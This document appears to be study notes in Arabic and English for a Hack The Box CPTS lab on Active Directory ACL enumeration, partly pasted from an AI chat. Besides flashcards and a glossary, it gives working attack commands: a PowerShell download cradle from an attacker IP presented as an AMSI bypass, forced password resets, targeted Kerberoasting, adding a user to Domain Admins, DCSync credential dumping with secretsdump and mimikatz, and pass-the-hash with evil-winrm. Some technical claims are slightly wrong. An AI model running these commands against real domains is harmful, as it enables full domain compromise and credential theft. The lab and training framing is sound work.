━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #6

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هي الصلاحية (`ObjectAceType`) التي تتيح لك تنفيذ هجوم DCSync وسحب كلمات سر الدومين؟

✅ Back: صلاحية `DS-Replication-Get-Changes` و `DS-Replication-Get-Changes-In-Filtered-Set`.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #7

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: في BloodHound، ماذا تعني قائمة `Transitive Object Control`؟

✅ Back: تعرض الكائنات التي يمكنك السيطرة عليها بشكل "غير مباشر" عبر سلسلة من القفزات المتعددة (مثل وراثة الجروبات أو السيطرة على مدراء).

━━━━━

📄 ورقة غش السكشن — للسكرين شوت

🛑 ورقة غش: تعداد واستكشاف الصلاحيات (ACL Enumeration)

🎯 هدف هذا السكشن بجملة:

تحديد الكائنات التي تملك عليها سيطرة (مباشرة أو متعدية) انطلاقاً من حسابك المخترق باستخدام PowerView لبناء مسار هجوم، وتصوير ذلك عبر BloodHound.

⚔️ خوارزمية التطبيق للتعداد اليدوي (PowerView):

١. احصل على הـ SID الخاص بحسابك المخترق (`Convert-NameToSid`).

٢. ابحث عن الأوبجكتات التي يمتلك فيها هذا الـ SID صلاحيات باستخدام (`Get-DomainObjectACL`).

٣. استخدم الفلتر `Where-Object` (علامة `?`) لعزل الصلاحيات الخاصة بك فقط.

٤. تأكد من تفعيل `-ResolveGUIDs` لقراءة الصلاحية باللغة الإنجليزية.

٥. إذا كانت الصلاحية على Group، تفقد الـ Nested Groups (`Get-DomainGroup`).

📐 جدول الأوامر الأساسية لهذا السكشن:

|**الهدف**|**الأمر**|**ملاحظة**|
|---|---|---|
|استخراج SID ליوزر|`$sid = Convert-NameToSid wley`|خطوة التجهيز الأولى.|
|بحث موجه ومترجم|`Get-DomainObjectACL -ResolveGUIDs -Identity * \| ? {$_.SecurityIdentifier -eq $sid}`|سحب الصلاحيات الخاصة باليوزر المختار فقط وترجمتها.|
|التحقق من تداخل المجموعات|`Get-DomainGroup -Identity "Help Desk Level 1" \| select memberof`|لمعرفة الجروبات الأعلى التي سترث صلاحياتها.|
|بحث عن طريق سطر اوامر اصلي|`get-acl "AD:\$(Get-ADUser username)"`|بديل لـ PowerView إذا كان محظوراً (Native LOLBAS).|

🔢 مفاتيح وحقول مهمة يجب مراقبتها بالـ Output:

- `ObjectDN`: من هو الضحية الذي نملك صلاحية عليه؟
    
- `SecurityIdentifier`: من هو الفاعل (أنت)؟
    
- `ObjectAceType`: ما هي الصلاحية التي نملكها (مثلاً GenericAll)؟
    

🚨 الفخوخ الخاصة بهذا السكشن:

❌ [فخ ١]: نسيان استخدام `-ResolveGUIDs` والغرق في محاولة فهم أرقام GUID مبهمة.

❌ [فخ ٢]: تشغيل `Find-InterestingDomainAcl` في شبكة فعلية ضخمة مما يؤدي لتجميد الجهاز أو كشف نشاطك.

❌ [فخ ٣]: العثور على `GenericWrite` لجروب وإضافة نفسك، ثم الفشل بالاستغلال بسبب عدم تحديث الـ Session (Log off / Log on) للحصول على الـ Token الجديد.

💡 Golden Tip:

دائماً ابدأ بـ BloodHound لرؤية الصورة الكبيرة (Big Picture) والمسارات القصيرة (Shortest Paths)، واستخدم PowerView للتحقق الفوري (Verification) من عقدة محددة قبل تنفيذ الهجوم للتأكد من عدم تغيير الإعدادات مؤخراً.

━━━━━

🎯 رسالة الختام:

بهيج خلصنا. هسة عندك:

✅ ليش هذا الموضوع موجود (Big Picture)

✅ كل المصطلحات الجديدة بالسكشن

✅ كيف السكشن مبني وشنو يبي يعلمك

✅ الشرح العميق لكل مفهوم بأمثلة وتشبيهات

✅ ما لم يقله HTB (الـ gotchas والثغرات بالشرح)

✅ فلاشكاردز السكشن

✅ ورقة غش مخصصة للـ lab

الآن ارجع اقرأ نص السكشن الأصلي بـ HTB — وراح تلاحظ إن كل جملة صارت واضحة وإن فاهم ليش موجودة. بالتوفيق! 💪]

```text
══════════════════════════════════════════════════════════════════
[✓] PHASE_I EXTRACTION COMPLETE
[✓] THEORETICAL FRAMEWORK LOADED INTO MEMORY
[→] TRANSITIONING TO LIVE CHALLENGE ENVIRONMENT . . .
══════════════════════════════════════════════════════════════════
```

## 🎯 PHASE_II — حقل التدريب :: السؤال وطرق الحل الستة

> [!success] ☣️ PHASE II INITIALIZED · LIVE CHALLENGE ENVIRONMENT
> **Language:** English — **Size:** ~2,000 Words
> **Content:** Official HTB question · Lab target setup · 6 attack methods against live infrastructure.

[
---

## 1\. THE QUESTION & SYSTEMATIC THOUGHT PROCESS

### 🔍 Re-stating the Problem in Simple Terms

These five questions are all about **ACL Enumeration** — the process of discovering which users have special permissions over other users, groups, or objects inside an **Active Directory (AD)** environment.

Think of Active Directory like a **company's organizational chart + security system combined**. Every object (user, group, computer, etc.) has a list called an **ACL (Access Control List)** that says: _"User A is allowed to do X to me."_ These rules are called **ACEs (Access Control Entries)**.

As a penetration tester, you want to find misconfigurations like:

-   User A can **force-change the password** of User B (without knowing the old one!)
-   User B can **add members** to a security group
-   That group eventually leads to **Domain Admin** access

This is called an **ACL Attack Chain** — each link takes you closer to full control.

### 🧠 The Hacker's Mental Model

```
wley ──(ForceChangePassword)──► damundsen ──(GenericWrite on group)──►
Help Desk Level 1 ──(nested in)──► Information Technology ──(GenericAll)──►
adunn ──(DCSync rights)──► DOMAIN CONTROLLER = GAME OVER
```

Every arrow above is an ACE discovered through enumeration. You are mapping a **privilege escalation path**.

### 🎯 Why We Use These Specific Tools

Tool

Why It's Used

**PowerView**

Purpose-built for AD enumeration; can resolve GUIDs to readable names

**Built-in PS cmdlets** (`Get-Acl`, `Get-ADUser`)

Available on client machines where PowerView may be blocked

**BloodHound**

Visualizes entire attack paths automatically

---

## 2\. SIX DISTINCT SOLUTION APPROACHES

### 📌 Setup (Do this first on the RDP target)

powershell

```
# Step 1: RDP into the target (from your attacker machine or Pwnbox)
xfreerdp /v:<TARGET_IP> /u:htb-student /p:Academy_student_AD!

# Step 2: Open PowerShell as the htb-student user
# Step 3: Import PowerView (it's on the Desktop)
Import-Module C:\Tools\PowerView.ps1
```

---

### ✅ Approach 1 — Direct GUID Lookup via Microsoft Documentation (Q1)

**What this solves:** Finding the GUID for `User-Force-Change-Password` without any tools.

**Command:**

powershell

```
# Reverse-lookup a GUID to a human-readable right name
$guid = "00299570-246d-11d0-a768-00aa006e0529"

Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" `
  -Filter {ObjectClass -like 'ControlAccessRight'} `
  -Properties * | Select-Object Name, DisplayName, DistinguishedName, rightsGuid `
  | Where-Object {$_.rightsGuid -eq $guid} | Format-List
```

**Expected Output:**

```
Name              : User-Force-Change-Password
DisplayName       : Reset Password
DistinguishedName : CN=User-Force-Change-Password,CN=Extended-Rights,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
rightsGuid        : 00299570-246d-11d0-a768-00aa006e0529
```

**✅ Answer to Q1:** `00299570-246d-11d0-a768-00aa006e0529`

> **Failure Scenarios:**
> 
> -   The `ActiveDirectory` module is not installed → Run `Install-WindowsFeature RSAT-AD-PowerShell` or use PowerView instead
> -   The account lacks rights to query the Configuration partition → Try a different account

> **Pivot Trigger:** If `Get-ADObject` returns nothing or throws a `cmdlet not found` error, move to Approach 2.

---

### ✅ Approach 2 — PowerView with `-ResolveGUIDs` (Q2, Q3)

**What this solves:** Enumerating what rights user `wley` has, and then what `damundsen` has — but now with **human-readable** output instead of raw GUIDs.

**Command:**

powershell

```
# Get the SID of wley first
$sid = Convert-NameToSid wley

# Now search for all objects where wley has rights — with readable names
Get-DomainObjectACL -ResolveGUIDs -Identity * | Where-Object {$_.SecurityIdentifier -eq $sid}
```

**Expected Output:**

```
AceQualifier           : AccessAllowed
ObjectDN               : CN=Dana Amundsen,OU=DevOps,...,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password   ← Human readable!
...
```

**Without** `-ResolveGUIDs`, it would show `00299570-246d-11d0-a768-00aa006e0529` — totally unreadable.

**✅ Answer to Q2:** `-ResolveGUIDs`

Now for Q3 — enumerate what `damundsen` can do:

powershell

```
$sid2 = Convert-NameToSid damundsen
Get-DomainObjectACL -ResolveGUIDs -Identity * | Where-Object {$_.SecurityIdentifier -eq $sid2}
```

**Expected Output:**

```
AceType               : AccessAllowed
ObjectDN              : CN=Help Desk Level 1,OU=Security Groups,...,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite   ← KEY FIELD
...
```

**✅ Answer to Q3:** `GenericWrite`

> **Failure Scenarios:**
> 
> -   `Identity *` makes this slow (1-2 minutes minimum). In large environments it may time out.
> -   PowerView may be flagged by Windows Defender/AMSI (blocked before it runs)

> **Pivot Trigger:** If the command runs for more than 5 minutes with no output, or if you get an AMSI/AV warning, move to Approach 3.

---

### ✅ Approach 3 — Targeted Enumeration for `forend` over `dpayne` (Q4)

**What this solves:** Finding the specific rights `forend` has over `dpayne`.

powershell

```
# Step 1: Get forend's SID
$sid3 = Convert-NameToSid forend

# Step 2: Enumerate ACLs — target the specific user dpayne for speed
Get-DomainObjectACL -ResolveGUIDs -Identity "dpayne" | Where-Object {$_.SecurityIdentifier -eq $sid3}
```

> **Why target `dpayne` specifically?** Instead of scanning ALL objects (`-Identity *`), we query only the object we care about. This is **much faster**.

**Expected Output:**

```
AceQualifier           : AccessAllowed
ObjectDN               : CN=Dagmar Payne,OU=...,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : GenericAll        ← THIS IS THE ANSWER
ObjectAceType          : All
SecurityIdentifier     : S-1-5-21-...-XXXX  (forend's SID)
...
```

**✅ Answer to Q4:** `GenericAll`

> **What does `GenericAll` mean?**  
> It means forend has **FULL CONTROL** over dpayne. This includes:
> 
> -   Resetting their password
> -   Adding them to groups
> -   Performing targeted Kerberoasting
> -   Modifying any attribute

> **Failure Scenarios:**
> 
> -   `dpayne` is the display name but the samAccountName might differ. Use `Get-ADUser -Filter {DisplayName -like "*Dagmar*"}` to verify.

> **Pivot Trigger:** If the query returns empty, check the SamAccountName: `Get-ADUser -Filter * | Select-Object Name, SamAccountName | Where-Object {$_.Name -like "*Payne*"}`

---

### ✅ Approach 4 — Enumerating `forend` over `GPO Management` Group (Q5)

**What this solves:** Finding the ObjectAceType of forend's first right over the GPO Management group.

powershell

```
# Re-use forend's SID from Approach 3
$sid3 = Convert-NameToSid forend

# Target the specific group for speed
Get-DomainObjectACL -ResolveGUIDs -Identity "GPO Management" | Where-Object {$_.SecurityIdentifier -eq $sid3}
```

**Expected Output:**

```
AceType               : AccessAllowed
ObjectDN              : CN=GPO Management,OU=Security Groups,...,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : Self
ObjectAceType         : Self-Membership     ← THIS IS THE ANSWER
...
```

**✅ Answer to Q5:** `Self-Membership`

> **What does `Self-Membership` mean?**  
> The user `forend` can **add themselves** to the GPO Management group. They don't need someone else to do it for them — they can self-enroll.

> **Failure Scenarios:**
> 
> -   The group name might need exact capitalization: `"GPO Management"` not `"gpo management"`
> -   Multiple ACEs may be returned — the question asks for the **first** one

> **Pivot Trigger:** If no results, try: `Get-DomainGroup -Identity "GPO*"` to verify the exact group name.

---

### ✅ Approach 5 — Using Built-in PowerShell (No PowerView Required)

**What this solves:** Finding ACL rights without any third-party tool (fallback method).

powershell

```
# Step 1: Export all user SamAccountNames
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > C:\Users\htb-student\Desktop\ad_users.txt

# Step 2: Loop through each user and check ACLs for forend
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {
    Get-Acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access `
    | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\forend'}
}
```

**Expected Output (partial):**

```
Path                  : Microsoft.ActiveDirectory.Management.dll\ActiveDirectory:://RootDSE/CN=Dagmar Payne,...
ActiveDirectoryRights : GenericAll
InheritanceType       : All
ObjectType            : 00000000-0000-0000-0000-000000000000
...
IdentityReference     : INLANEFREIGHT\forend
```

> **Note:** You'll get the GUID `00000000-0000-0000-0000-000000000000` for `GenericAll` since it applies to all object types. You'll need to then run the reverse GUID lookup from Approach 1 to decode it.

> **Failure Scenarios:**
> 
> -   This loop is **very slow** in large environments (can take 10+ minutes)
> -   The `ActiveDirectory` module must be installed (`RSAT` tools)

> **Pivot Trigger:** If the loop hangs or the AD module is unavailable, use PowerView (Approach 2/3/4).

---

### ✅ Approach 6 — BloodHound Visual Path Analysis

**What this solves:** Visually confirming all attack paths simultaneously — the professional's shortcut.

**Steps:**

bash

```
# Step 1: On the target (or via RDP), run SharpHound ingestor
.\SharpHound.exe -c All --zipfilename bloodhound_data.zip

# Step 2: Transfer the zip to your attacker machine
# Step 3: Start BloodHound
sudo neo4j start
bloodhound &

# Step 4: Upload the ZIP file via the "Upload Data" button
```

**BloodHound Queries to answer the questions:**

```
# In BloodHound search box:
1. Search for "wley" → Node Info → Outbound Control Rights → First Degree Object Control
2. Search for "forend" → Node Info → Outbound Control Rights
3. Use pre-built query: "Find Principals with DCSync Rights"
```

**Expected Visual Output:**

-   Nodes (circles) connected by labeled arrows
-   `wley` → `ForceChangePassword` → `damundsen`
-   `forend` → `GenericAll` → `dpayne`

> **Failure Scenarios:**
> 
> -   AV/EDR may flag SharpHound as malicious
> -   Neo4j database may not start if Java is missing
> -   Large environments create very large ZIP files

> **Pivot Trigger:** If SharpHound is blocked, use PowerView approaches above. BloodHound is the ideal tool but not always available.

---

## 3\. THE "WHAT IF" MASTERCLASS — 6 CPTS Scenarios

---

**🔴 Scenario 1: What if PowerView is blocked by Windows Defender/AMSI?**

**The Problem:** When you run `Import-Module .\PowerView.ps1`, Windows Defender catches and blocks it. You see:

```
Import-Module : File PowerView.ps1 cannot be loaded because running scripts is disabled...
```

or an AMSI trigger error.

**The Solution:**

powershell

```
# Option A: AMSI Bypass (load into memory, bypasses string-based detection)
IEX (New-Object Net.WebClient).DownloadString('http://<YOUR_IP>/PowerView.ps1')

# Option B: Use the built-in AD module (no bypass needed)
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName

# Option C: Use encoded commands to bypass script-based detection
$bytes = [System.IO.File]::ReadAllBytes("C:\Tools\PowerView.ps1")
$encoded = [Convert]::ToBase64String($bytes)
powershell -EncodedCommand $encoded

# Option D: Use PowerView's obfuscated/renamed version
# Rename functions like Get-DomainObjectACL to Get-ADObjectACL
```

**Key Lesson:** Never rely on a single tool. Always have the native `Get-Acl` + `Get-ADObject` workflow as your backup.

---

**🔴 Scenario 2: What if the user you control has no interesting ACL rights?**

**The Problem:** You run `Get-DomainObjectACL -ResolveGUIDs -Identity * | Where-Object {$_.SecurityIdentifier -eq $sid}` and get **zero results** or only meaningless rights.

**The Solution — Enumerate the full user's group memberships first:**

powershell

```
# Check what groups your user belongs to
Get-ADUser -Identity wley -Properties MemberOf | Select-Object -ExpandProperty MemberOf

# Check if any of those groups have interesting ACLs
$groupSID = Convert-NameToSid "YourGroup"
Get-DomainObjectACL -ResolveGUIDs -Identity * | Where-Object {$_.SecurityIdentifier -eq $groupSID}

# Also check for nested group memberships
Get-DomainGroup -Identity "YourGroup" | Select-Object memberof
```

**Key Lesson:** ACL rights can come from **group membership**, not just direct user assignment. Always enumerate both.

---

**🟡 Scenario 3: What if you find GenericWrite on a Group — what exactly can you do?**

**The Problem:** You find `damundsen` has `GenericWrite` over `Help Desk Level 1`. You know this is useful but aren't sure what to do next.

**The Solution — GenericWrite on a group allows you to add members:**

powershell

```
# Step 1: Change damundsen's password (since wley has ForceChangePassword)
$newpass = ConvertTo-SecureString 'NewPass@123!' -AsPlainText -Force
Set-DomainUserPassword -Identity damundsen -AccountPassword $newpass

# Step 2: Authenticate as damundsen (open new PS window or use runas)
$cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $newpass)

# Step 3: Use GenericWrite to add yourself to the group
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $cred

# Step 4: Verify membership
Get-DomainGroupMember -Identity 'Help Desk Level 1'
```

**Key Lesson:** `GenericWrite` on a **group** = you can add members. `GenericWrite` on a **user** = you can modify attributes (like setting an SPN for Kerberoasting).

---

**🟡 Scenario 4: What if you find GenericAll on a User — what are ALL the attacks possible?**

**The Problem:** `forend` has `GenericAll` over `dpayne`. You want to know every possible attack vector.

**The Solution — GenericAll = Full Control. Here are all your options:**

powershell

```
# OPTION 1: Force change their password
Set-DomainUserPassword -Identity dpayne -AccountPassword (ConvertTo-SecureString 'Hacked@123!' -AsPlainText -Force)

# OPTION 2: Targeted Kerberoasting (set a fake SPN, request ticket, crack offline)
Set-DomainObject -Identity dpayne -SET @{serviceprincipalname='fake/NOTHING'}
# Then use Rubeus or GetUserSPNs.py to request the TGS ticket

# OPTION 3: Shadow Credentials attack (if ADCS is present)
# Add a Key Credential Link to dpayne's msDS-KeyCredentialLink attribute

# OPTION 4: Add them to a privileged group
Add-DomainGroupMember -Identity 'Domain Admins' -Members dpayne

# OPTION 5: Set their account to not require Kerberos pre-auth (ASREPRoasting)
Set-DomainObject -Identity dpayne -XOR @{useraccountcontrol=4194304}
```

**Key Lesson:** `GenericAll` is the most dangerous right. It's essentially full ownership of that object. **Always check for it.**

---

**🟡 Scenario 5: What if the ObjectAceType returns a GUID instead of a name even with -ResolveGUIDs?**

**The Problem:** Despite using `-ResolveGUIDs`, you still see a raw GUID like `ab721a53-1e2f-11d0-9819-00aa0040529b` in the output.

**The Solution — Do a manual reverse GUID lookup:**

powershell

```
# Manual reverse GUID lookup
$mystery_guid = "ab721a53-1e2f-11d0-9819-00aa0040529b"

# Method 1: Query Extended-Rights in the Configuration partition
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" `
  -Filter {ObjectClass -like 'ControlAccessRight'} `
  -Properties * | Where-Object {$_.rightsGuid -eq $mystery_guid} | Select-Object Name, DisplayName

# Method 2: Query the Schema partition for attribute-based GUIDs
Get-ADObject -SearchBase "CN=Schema,$((Get-ADRootDSE).ConfigurationNamingContext)" `
  -Filter {ObjectClass -like 'attributeSchema'} `
  -Properties * | Where-Object {$_.schemaIDGUID -eq [guid]$mystery_guid} | Select-Object Name

# Method 3: Google it — Microsoft's AD Schema documentation
# https://docs.microsoft.com/en-us/windows/win32/adschema/
```

**Key Lesson:** There are two places GUIDs live: `Extended-Rights` (for access rights like ForceChangePassword) and `Schema` (for attribute-level access). Know both.

---

**🔴 Scenario 6: What if the attack chain leads to DCSync rights — what does that mean and how do you exploit it?**

**The Problem:** You've followed the full chain and now have control over `adunn`, who has `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-In-Filtered-Set` rights. What now?

**The Solution — DCSync Attack:**

These two rights together allow a user to **pretend to be a Domain Controller** and request password hashes for ANY account, including **krbtgt** and **Administrator**.

bash

```
# From your Linux attacker machine (or Pwnbox)
# Using secretsdump.py (Impacket)
python3 secretsdump.py -outputfile inlanefreight_hashes \
  -just-dc INLANEFREIGHT/adunn@<DC_IP>

# OR target a specific user's hash
python3 secretsdump.py -just-dc-user Administrator \
  INLANEFREIGHT/adunn@<DC_IP>

# Expected output:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796EE39FD3A9C3A1573966A64CC31CC:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd9d3a7c49b1...
```

powershell

```
# From Windows (using Mimikatz)
.\mimikatz.exe
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:Administrator
```

**What to do with the hashes:**

bash

```
# Pass-the-Hash to get a shell as Administrator
evil-winrm -i <DC_IP> -u Administrator -H 7796EE39FD3A9C3A1573966A64CC31CC

# Or crack the hash offline with Hashcat
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

**Key Lesson:** DCSync = Game Over for the domain. The full attack chain we enumerated leads here. This is why ACL misconfigurations are **critical findings** in any penetration test report.

---

## 📊 Full Attack Chain Summary

```
wley (compromised via LLMNR poisoning)
  │
  │ [ForceChangePassword — GUID: 00299570-246d-11d0-a768-00aa006e0529]
  ▼
damundsen
  │
  │ [GenericWrite over group]
  ▼
Help Desk Level 1 ──(nested in)──► Information Technology
                                         │
                                         │ [GenericAll]
                                         ▼
                                       adunn
                                         │
                                         │ [DS-Replication-Get-Changes + DS-Replication-Get-Changes-In-Filtered-Set]
                                         ▼
                                   DCSync Attack → ALL HASHES → Domain Compromise
```

---

## 🎓 Key Concepts to Remember for CPTS

Term

Simple Definition

**ACL**

A list saying who can do what to an AD object

**ACE**

One single rule within an ACL

**GUID**

A unique ID for a specific right/property (like `00299570...` = ForceChangePassword)

**`-ResolveGUIDs`**

PowerView flag that translates GUIDs to readable names

**`GenericAll`**

Full control over an object — the most dangerous right

**`GenericWrite`**

Can modify most attributes, including group membership

**`ForceChangePassword`**

Can reset a user's password without knowing the old one

**`Self-Membership`**

A user can add themselves to a group

**`DCSync`**

Replication rights that let you pull password hashes from a DC

$0.147,707 tok175.5s

Responses are AI-generated and can be inaccurate. Review all outputs before relying on them.

Select a modelSelect a model]

```text
══════════════════════════════════════════════════════════════════
[✓] PHASE_II ATTACK SEQUENCES DOCUMENTED
[✓] 6 / 6 EXPLOITATION METHODS CAPTURED
[→] LOADING DEEP-DIVE ANALYSIS & GLOSSARY . . .
══════════════════════════════════════════════════════════════════
```

## 🔴 PHASE_III — دليل الاختراق :: التحليل والمصطلحات

> [!success] ⚠️ PHASE III INITIALIZED · EXPLOITATION GUIDE & GLOSSARY
> **Language:** Arabic + English Mixed — **Size:** ~2,000 Words
> **Content:** Arabic breakdown of all 6 methods · Flashcards · Cheat Sheet · Golden Tips.

[تمام! استلمت التحدي. خلني أشرحلك إياه من الألف للياء:

🟢 Big Picture → 🔵 المصطلحات → 🟡 تحليل التحدي → 🟠 الاستغلال → 🔴 ماذا لو → 💎 فلاشكاردز → 📄 ورقة غش

يله نبدأ...

━━━━━

🟢 المرحلة 0: ما قبل الصفر — Big Picture

تخيل وياي أن الـ Active Directory (AD) هو عبارة عن شركة عملاقة بيها آلاف الموظفين (Users)، ومئات الأقسام (Groups)، وأجهزة كمبيوتر وسيرفرات (Computers). هاي الشركة تحتاج نظام أمني صارم حتى تحدد "منو يكدر يسوي شنو".

النظام الأمني هذا يعتمد على شي اسمه Access Control List (ACL) أو "قائمة التحكم بالوصول". تخيل أن كل موظف، كل قسم، وكل سيرفر بهذي الشركة معلّق على بابه ورقة (ACL). هذي الورقة مكتوب بيها سطور، كل سطر اسمه Access Control Entry (ACE).

شنو مكتوب بهذي السطور؟

مكتوب مثلاً: "أحمد من قسم الـ IT مسموح له يغير الباسورد مال سيرفر المبيعات"، أو "سارة مسموح لها تضيف موظفين جدد لجروب الـ Help Desk".

المشكلة وين تصير؟

الشركة من تكبر ويصير عمر الـ Domain عشر سنين أو أكثر، مدراء النظام (Domain Admins) يتعبون من كثرة الطلبات، فيبدون يوزعون صلاحيات (Delegation) للموظفين العاديين حتى يمشون الشغل. مثلاً، ينطون موظف الدعم الفني (Help Desk) صلاحية أنه يغير باسورودات الموظفين العاديين.

بس مرات، بسبب خطأ صغير بالإعدادات (Misconfiguration)، ينطون هذا الموظف صلاحية أنه يغير باسورد "مدير النظام" نفسه! أو ينطوه صلاحية أنه يضيف نفسه بجروب المدراء!

هنا يجي دورنا كـ Penetration Testers أو Red Teamers. إحنا ما ندور على ثغرة برمجية (Exploit) بنظام الويندوز، إحنا ندور على "أخطاء إدارية" بهذي الأوراق المعلقة على الأبواب (ACLs). إحنا نسوي عملية نسميها ACL Enumeration (تعداد الصلاحيات) حتى نرسم خريطة، هذي الخريطة تكول:

"لو اخترقنا حساب يوزر عادي (A)، راح نكتشف أنه عنده صلاحية يغير باسورد يوزر (B). ويوزر (B) عنده صلاحية يضيف نفسه بجروب (C). وجروب (C) هو جروب مدراء النظام (Domain Admins)!"

وهيج، بحركات قانونية جداً (Abuse of Features)، نستولي على الـ Domain بالكامل (Game Over).

هذا التحدي اللي قدمته يعلمنا الأساسيات: شلون نقرأ هذي الأوراق، شلون نفهم الطلاسم المكتوبة بيها (مثل الـ GUIDs والـ SIDs)، وشلون نستخدم أدوات مثل PowerView حتى نترجم هذي الطلاسم للغة بشرية مفهومة ونلقف مسار الهجوم.

━━━━━

🔵 المرحلة 1: المصطلحات

قبل ما نكتب أي أمر، لازم نفهم لغة الـ Active Directory. هاي المصطلحات راح تشوفها بكل مكان بهذا المجال:

Active Directory (مجلد النشاطات / الدليل النشط)

- شنو يعني؟ هو قاعدة البيانات المركزية لشبكات الويندوز. يخزن كل اليوزرات، الباسوردات، الصلاحيات، والأجهزة. هو قلب أي شركة.
    

Domain Controller / DC (متحكم المجال)

- شنو يعني؟ هو السيرفر (أو السيرفرات) اللي يشتغل عليه الـ Active Directory. هو اللي يوافق على تسجيل دخولك، وهو الهدف النهائي لأي هجوم (لأن من يسيطر عليه، يسيطر على الشركة كلها).
    

Object (الكائن)

- شنو يعني؟ بالـ AD، أي شي هو Object. اليوزر هو Object، الجروب هو Object، الكمبيوتر هو Object. وكل Object إله خصائص (Attributes).
    

SID - Security Identifier (المُعرّف الأمني)

- شنو يعني؟ الويندوز ما يهتم باسمك "أحمد" أو "علي". الويندوز يتعامل ويه أرقام فريدة. الـ SID هو رقمك القومي داخل الشبكة. مستحيل يتكرر.
    
- مثال بسيط: `S-1-5-21-123456789-1001`
    

GUID - Globally Unique Identifier (المُعرّف الفريد عالمياً)

- شنو يعني؟ هو رقم طويل جداً (عبارة عن حروف وأرقام) يستخدم لتعريف أشياء معينة بالويندوز، مثل "أنواع الصلاحيات". الويندوز ما يكتب "صلاحية تغيير الباسورد"، بل يكتب GUID خاص بيها.
    
- مثال بسيط: `00299570-246d-11d0-a768-00aa006e0529`
    

ACL - Access Control List (قائمة التحكم بالوصول)

- شنو يعني؟ هي القائمة (الورقة) المربوطة بكل Object. تحدد منو مسموح له يقرأ، يكتب، أو يعدل على هذا الـ Object.
    

ACE - Access Control Entry (إدخال التحكم بالوصول)

- شنو يعني؟ هو سطر واحد داخل الـ ACL. يتكون من: (منو الشخص؟ شنو الصلاحية؟ مسموح لو ممنوع؟).
    

GenericAll (التحكم الكامل)

- شنو يعني؟ صلاحية خطيرة جداً. إذا يوزر عنده GenericAll على يوزر ثاني، يعني يكدر يسوي بي أي شي (يغير باسورده، يمسحه، يعدل بياناته).
    

GenericWrite (الكتابة العامة)

- شنو يعني؟ صلاحية تسمح لليوزر أنه يعدل على خصائص (Attributes) معينة لـ Object آخر. مفيدة جداً بالهجمات (مثلاً تغيير الـ SPN أو مسار السكريبت).
    

Self-Membership (الإنضمام الذاتي)

- شنو يعني؟ صلاحية نادرة بس قاتلة. إذا يوزر عنده هذي الصلاحية على "جروب"، يعني يكدر يضيف نفسه داخل هذا الجروب بدون موافقة أحد!
    

PowerView (أداة الرؤية القوية)

- شنو يعني؟ سكريبت PowerShell مشهور جداً كتبه (HarmJ0y). شغلته يسهّل عملية قراءة الـ AD واستخراج هذي الصلاحيات المعقدة بشكل سريع وبدون ما تحتاج أدوات خارجية (لأن كل شي يتم بالـ Memory).
    
- وين يظهر بالأدوات/الأوامر؟ نستخدمه عبر استدعائه بـ `Import-Module` ثم كتابة أوامره مثل `Get-DomainObjectACL`.
    

BloodHound (كلب الصيد)

- شنو يعني؟ أداة ترسم لك الصلاحيات والـ ACLs بشكل رسومي (Nodes and Edges). بدل ما تقرأ آلاف السطور النصية، تشوف خريطة تكولك: "هذا اليوزر يوصلك لهذا الجروب".
    

━━━━━

🟡 المرحلة 2: تحليل التحدي + كيف تفكر

📖 ترجمة التحدي:

أنت طالب أو مختبر اختراق، عندك وصول مبدئي (Foothold) لشبكة عبر حساب طالب (htb-student) باستخدام اتصال RDP. مهمتك هي الإجابة على ٥ أسئلة تتعلق بصلاحيات معينة (ACLs) داخل الدومين (INLANEFREIGHT.LOCAL). الأسئلة تتطلب منك البحث عن GUIDs معينة، ومعرفة الصلاحيات الدقيقة اللي يمتلكها يوزرات مثل `damundsen` و `forend`. الهدف النهائي هو رسم مسار هجوم (Attack Path) يوصلنا للـ Domain Controller.

🎯 معطيات السيناريو:

- الدخول: RDP إلى التارجت.
    
- اليوزر: htb-student.
    
- الباسورد: موجودة (معطاة).
    
- الأداة المتاحة: PowerView.ps1 موجودة على الـ Desktop.
    

❓ المطلوب (الأسئلة الـ ٥):

١. شنو هو الـ GUID الخاص بصلاحية `User-Force-Change-Password`؟

٢. شنو هو الـ flag (المعامل) بـ PowerView اللي يترجم الـ GUIDs إلى أسماء مقروءة للبشر؟

٣. شنو هي الصلاحية اللي يمتلكها اليوزر `damundsen` على جروب `Help Desk Level 1`؟

٤. شنو هي الـ ActiveDirectoryRights اللي يمتلكها اليوزر `forend` على اليوزر `dpayne`؟

٥. شنو هي أول ObjectAceType يمتلكها اليوزر `forend` على الـ `GPO Management`؟

🧭 كيف تفكر؟ — Decision Trees:

إحنا هسة داخل بيئة ويندوز (RDP)، وعدنا وصول لـ PowerShell.

خطوة ١: التجهيز

لازم نفتح PowerShell ونسوي استيراد (Import) لأداة PowerView حتى نكدر ننفذ أوامر الاستطلاع.

خطوة ٢: حل السؤال الأول (البحث عن GUID)

كيف نلقي الـ GUID لـ `User-Force-Change-Password`؟

- خيار أ: نبحث بـ Google (بس بالامتحان أو التحديات المغلقة ماكو إنترنت).
    
